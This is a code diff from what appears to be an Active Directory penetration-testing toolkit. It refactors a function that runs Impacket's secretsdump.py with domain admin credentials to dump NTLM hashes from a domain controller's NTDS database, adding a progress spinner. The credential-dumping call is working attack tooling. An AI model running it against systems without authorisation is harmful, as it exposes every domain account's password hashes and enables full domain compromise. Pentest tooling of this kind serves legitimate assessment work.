@@ -18,7 +18,8 @@ from ad_kit.core.util import (
     load_session,
     save_session, 
     get_artefacts_dir, 
-    generate_scp_command
+    generate_scp_command,
+    progress
 )
 
 
@@ -72,36 +73,35 @@ def run_dump() -> None:
 
         output_dir = get_artefacts_dir()
 
-        print_info("Running secretsdump...")
+        with progress("[cyan]Running secretsdump..."):
+            result = subprocess.run(
+                [
+                    "secretsdump.py",
+                    (
+                        f"{domain}/"
+                        f"{da_user}:"
+                        f"{da_pass}@"
+                        f"{dc_ip}"
+                    ),
+                    "-user-status",
+                    "-just-dc-ntlm",
+                    "-outputfile",
+                    domain,
+                ],
+                cwd=output_dir,
+                capture_output=True,
+                text=True,
+            )
 
-        result = subprocess.run(
-            [
-                "secretsdump.py",
-                (
-                    f"{domain}/"
-                    f"{da_user}:"
-                    f"{da_pass}@"
-                    f"{dc_ip}"
-                ),
-                "-user-status",
-                "-just-dc-ntlm",
-                "-outputfile",
-                domain,
-            ],
-            cwd=output_dir,
-            capture_output=True,
-            text=True,
-        )
+            if result.returncode != 0:
+                print_error("NTDS dump failed.")
 
-        if result.returncode != 0:
-            print_error("NTDS dump failed.")
+                if result.stderr:
+                    print_error(result.stderr.strip())
+                elif result.stdout:
+                    print_error(result.stdout.strip())
 
-            if result.stderr:
-                print_error(result.stderr.strip())
-            elif result.stdout:
-                print_error(result.stdout.strip())
-
-            return
+                return
 
         session_data["ntds_dumped"] = True
         save_session(session_data)
